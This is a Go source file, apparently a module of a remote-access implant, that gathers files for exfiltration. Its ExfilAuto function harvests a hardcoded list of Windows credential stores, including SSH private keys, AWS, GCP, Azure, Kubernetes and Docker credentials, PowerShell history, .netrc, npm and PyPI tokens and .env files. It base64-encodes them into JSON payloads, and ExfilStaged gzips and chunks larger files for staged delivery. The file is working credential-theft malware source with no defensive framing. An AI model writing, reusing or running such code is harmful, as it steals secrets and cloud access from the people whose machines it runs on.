package ttp

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

const (
	exfilMaxSingle = 512 * 1024
	exfilChunkSize = 256 * 1024
)

// ExfilFile is one file in an exfil result payload.
type ExfilFile struct {
	Path string `json:"p"`
	Size int    `json:"s"`
	Data string `json:"d"`
}

// ExfilResult is the JSON payload for TTP 30/31.
type ExfilResult struct {
	TTP   int         `json:"t"`
	Files []ExfilFile `json:"files"`
}

// ExfilChunk is the JSON payload for each TTP 32 chunk.
type ExfilChunk struct {
	TTP  int    `json:"t"`
	Path string `json:"p"`
	N    int    `json:"n"`
	M    int    `json:"m"`
	Data string `json:"d"`
}

var (
	chunkMu       sync.Mutex
	pendingChunks []string
)

// TakePendingExfilChunk returns and clears the next pending chunk, or "".
func TakePendingExfilChunk() string {
	chunkMu.Lock()
	defer chunkMu.Unlock()
	if len(pendingChunks) == 0 {
		return ""
	}
	chunk := pendingChunks[0]
	pendingChunks = pendingChunks[1:]
	return chunk
}

// ExfilManual reads path (file or glob), encodes up to exfilMaxSingle bytes.
func ExfilManual(pathPattern string) (string, error) {
	paths, err := filepath.Glob(pathPattern)
	if err != nil || len(paths) == 0 {
		if _, serr := os.Stat(pathPattern); serr == nil {
			paths = []string{pathPattern}
		} else {
			return "", fmt.Errorf("no files matching %q", pathPattern)
		}
	}

	result := ExfilResult{TTP: 30}
	totalBytes := 0

	for _, p := range paths {
		if totalBytes >= exfilMaxSingle {
			break
		}
		info, err := os.Stat(p)
		if err != nil || info.IsDir() {
			continue
		}
		remaining := exfilMaxSingle - totalBytes
		data, err := readFileCapped(p, remaining)
		if err != nil {
			continue
		}
		result.Files = append(result.Files, ExfilFile{
			Path: p,
			Size: int(info.Size()),
			Data: base64.StdEncoding.EncodeToString(data),
		})
		totalBytes += len(data)
	}

	if len(result.Files) == 0 {
		return "", fmt.Errorf("no readable files found")
	}
	out, _ := json.Marshal(result)
	return string(out), nil
}

// ExfilAuto collects high-priority Windows credential targets.
func ExfilAuto() (string, error) {
	home, _ := os.UserHomeDir()
	appdata := os.Getenv("APPDATA")
	localappdata := os.Getenv("LOCALAPPDATA")

	targets := []string{
		// SSH
		filepath.Join(home, `.ssh\id_rsa`),
		filepath.Join(home, `.ssh\id_ed25519`),
		filepath.Join(home, `.ssh\id_ecdsa`),
		filepath.Join(home, `.ssh\authorized_keys`),
		filepath.Join(home, `.ssh\known_hosts`),
		filepath.Join(home, `.ssh\config`),
		// AWS
		filepath.Join(home, `.aws\credentials`),
		filepath.Join(home, `.aws\config`),
		// GCP
		filepath.Join(appdata, `gcloud\credentials.db`),
		filepath.Join(appdata, `gcloud\application_default_credentials.json`),
		// Azure CLI
		filepath.Join(home, `.azure\accessTokens.json`),
		filepath.Join(home, `.azure\azureProfile.json`),
		// Kubernetes
		filepath.Join(home, `.kube\config`),
		// Docker
		filepath.Join(home, `.docker\config.json`),
		// PowerShell history
		filepath.Join(appdata, `Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`),
		// RDP saved hosts
		filepath.Join(localappdata, `Microsoft\Terminal Server Client\Default\Default.rdp`),
		// PuTTY known hosts
		filepath.Join(appdata, `putty\sshhostkeys`),
		// Git config
		filepath.Join(home, `.gitconfig`),
		filepath.Join(home, `.netrc`),
		// npm/pip tokens
		filepath.Join(home, `.npmrc`),
		filepath.Join(home, `.pypirc`),
		// .env in cwd
		`.env`,
		`.env.local`,
		`.env.production`,
	}

	// glob for SSH keys and .env files
	globTargets := []string{
		filepath.Join(home, `.ssh\id_*`),
		filepath.Join(home, `*.env`),
	}
	for _, g := range globTargets {
		matches, _ := filepath.Glob(g)
		targets = append(targets, matches...)
	}

	result := ExfilResult{TTP: 31}
	totalBytes := 0
	seen := map[string]bool{}

	for _, p := range targets {
		if totalBytes >= exfilMaxSingle || seen[p] {
			break
		}
		seen[p] = true
		info, err := os.Stat(p)
		if err != nil || info.IsDir() || info.Size() == 0 {
			continue
		}
		remaining := exfilMaxSingle - totalBytes
		data, err := readFileCapped(p, remaining)
		if err != nil {
			continue
		}
		result.Files = append(result.Files, ExfilFile{
			Path: p,
			Size: int(info.Size()),
			Data: base64.StdEncoding.EncodeToString(data),
		})
		totalBytes += len(data)
	}

	if len(result.Files) == 0 {
		return "", fmt.Errorf("no readable files found")
	}
	out, _ := json.Marshal(result)
	return string(out), nil
}

// ExfilStaged gzips filePath, splits into chunks, queues all for sequential delivery.
// Returns the first chunk immediately; remaining are delivered via TakePendingExfilChunk.
func ExfilStaged(filePath string) (string, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return "", fmt.Errorf("read %s: %w", filePath, err)
	}

	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	gz.Write(data)
	gz.Close()
	compressed := buf.Bytes()

	totalChunks := (len(compressed) + exfilChunkSize - 1) / exfilChunkSize
	if totalChunks == 0 {
		totalChunks = 1
	}

	var chunks []string
	for i := 0; i < totalChunks; i++ {
		start := i * exfilChunkSize
		end := start + exfilChunkSize
		if end > len(compressed) {
			end = len(compressed)
		}
		chunk := ExfilChunk{
			TTP:  32,
			Path: filePath,
			N:    i + 1,
			M:    totalChunks,
			Data: base64.StdEncoding.EncodeToString(compressed[start:end]),
		}
		encoded, _ := json.Marshal(chunk)
		chunks = append(chunks, string(encoded))
	}

	chunkMu.Lock()
	if len(chunks) > 1 {
		pendingChunks = append(pendingChunks, chunks[1:]...)
	}
	chunkMu.Unlock()

	return chunks[0], nil
}

func readFileCapped(path string, maxBytes int) ([]byte, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	buf := make([]byte, maxBytes)
	n, err := f.Read(buf)
	if err != nil && n == 0 {
		return nil, err
	}
	return buf[:n], nil
}

// FormatExfilSummary returns a human-readable summary of an exfil result.
func FormatExfilSummary(result string) string {
	if strings.HasPrefix(result, `{"t":32`) {
		var chunk ExfilChunk
		if json.Unmarshal([]byte(result), &chunk) == nil {
			return fmt.Sprintf("[exfil-staged] %s  chunk %d/%d  %.1fKB",
				chunk.Path, chunk.N, chunk.M, float64(len(chunk.Data))*3/4/1024)
		}
	}
	if strings.HasPrefix(result, `{"t":3`) {
		var res ExfilResult
		if json.Unmarshal([]byte(result), &res) == nil {
			totalSize := 0
			paths := make([]string, 0, len(res.Files))
			for _, f := range res.Files {
				totalSize += f.Size
				paths = append(paths, f.Path)
			}
			return fmt.Sprintf("[exfil] %d file(s)  %.1fKB  paths: %s",
				len(res.Files), float64(totalSize)/1024, strings.Join(paths, ", "))
		}
	}
	return result
}
